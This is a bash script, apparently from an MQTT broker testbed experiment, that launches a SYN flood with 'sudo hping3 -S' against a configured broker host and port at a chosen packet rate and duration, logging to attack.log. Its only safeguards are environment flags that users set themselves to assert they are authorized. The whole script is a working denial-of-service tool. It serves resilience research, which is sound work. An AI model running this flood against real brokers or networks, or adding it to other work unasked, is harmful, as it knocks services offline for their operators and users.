#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC1091
source "$SCRIPT_DIR/common.sh"
load_config
require_cmd hping3 timeout

if [[ "${I_UNDERSTAND_AUTHORIZED_TESTBED:-}" != "yes" ]]; then
  cat >&2 <<EOF
[ERR] Refusing to run SYN flood without explicit authorization.
Set I_UNDERSTAND_AUTHORIZED_TESTBED=yes only in an isolated/approved testbed.

Target would be:
  BROKER_HOST=$BROKER_HOST
  MQTT_PORT=$MQTT_PORT
  duration=${EXPERIMENT_DURATION}s
EOF
  exit 2
fi

if [[ "$DEPLOYMENT_MODE" != "local" && "${I_HAVE_WRITTEN_AUTHORIZATION:-}" != "yes" ]]; then
  cat >&2 <<EOF
[ERR] DEPLOYMENT_MODE=$DEPLOYMENT_MODE requires written authorization.
Set I_HAVE_WRITTEN_AUTHORIZATION=yes only when you have explicit approval to
generate SYN flood traffic to this broker/network.

Target would be:
  BROKER_HOST=$BROKER_HOST
  MQTT_PORT=$MQTT_PORT
EOF
  exit 2
fi

ensure_exp_dir
ATTACK_LOG="$EXP_DIR/attack.log"
if ! [[ "$ATTACK_RATE" =~ ^[0-9]+$ ]] || [[ "$ATTACK_RATE" -le 0 ]]; then
  echo "[ERR] ATTACK_RATE must be a positive integer packets/sec" >&2
  exit 1
fi
DELAY_US=$((1000000 / ATTACK_RATE))
if [[ "$DELAY_US" -lt 1 ]]; then
  DELAY_US=1
fi

echo "[INFO] SYN flood generator"
echo "[INFO] mode     : $DEPLOYMENT_MODE"
echo "[INFO] target   : $BROKER_HOST:$MQTT_PORT"
echo "[INFO] rate     : $ATTACK_RATE packets/sec"
echo "[INFO] duration : ${EXPERIMENT_DURATION}s"
echo "[INFO] log      : $ATTACK_LOG"

timeout --foreground "$EXPERIMENT_DURATION" sudo hping3 \
  -S \
  -p "$MQTT_PORT" \
  -i "u$DELAY_US" \
  "$BROKER_HOST" \
  > "$ATTACK_LOG" 2>&1 || status=$?

status="${status:-0}"
if [[ "$status" -ne 0 && "$status" -ne 124 ]]; then
  echo "[ERR] hping3 failed. See $ATTACK_LOG" >&2
  exit "$status"
fi

echo "[OK] attack run finished"
